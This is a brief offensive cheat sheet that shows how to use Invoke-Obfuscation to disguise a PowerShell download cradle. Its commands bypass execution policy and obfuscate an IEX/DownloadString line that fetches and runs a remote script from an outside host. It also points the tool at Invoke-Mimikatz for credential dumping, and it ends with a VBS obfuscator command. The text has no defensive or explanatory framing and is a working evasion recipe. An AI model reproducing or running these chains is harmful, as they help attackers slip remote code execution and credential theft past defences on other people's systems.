HELP:
One chain:
-----------
powershell -exec bypass -c Import-Module .\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://192.168.43.203:5000/psh/eo.ps1')} -Command 'Token\All\1,Encoding\5,Launcher\*\234,Out payload.txt' -Quiet -NoExit 


OR:

powershell -exec- bypass -c Import-Module .\Invoke-Obfuscation.psd1;Invoke-Obfuscation.ps1

SET SCRIPTBLOCK IEX (New-Object Net.WebClient).DownloadString('http://192.168.43.203:5000/psh/eo.ps1')

ou

SET SCRIPTPATH https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1


ENCODING/5

LAUNCHER/*/234

OUT



VBS OBFUSCATOR -----------------------

cscript.exe vbs_obfuscator.vbs sample.vbs > sample_obfuscated.vbs







